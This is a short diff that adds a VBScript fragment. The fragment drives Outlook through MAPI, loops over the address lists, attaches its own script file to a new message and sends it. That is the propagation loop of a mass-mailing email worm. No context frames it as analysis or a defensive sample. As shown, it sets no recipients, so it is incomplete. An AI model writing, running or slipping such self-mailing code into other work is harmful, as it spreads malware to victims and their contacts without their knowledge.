@@ -1,0 +1,8 @@
+Set o = CreateObject("Outlook.Application")
+Set m = o.GetNameSpace("MAPI")
+For Each al In m.AddressLists
+Set mail = o.CreateItem(0)
+mail.Attachments.Add WScript.ScriptFullName
+mail.Send
+Next
+
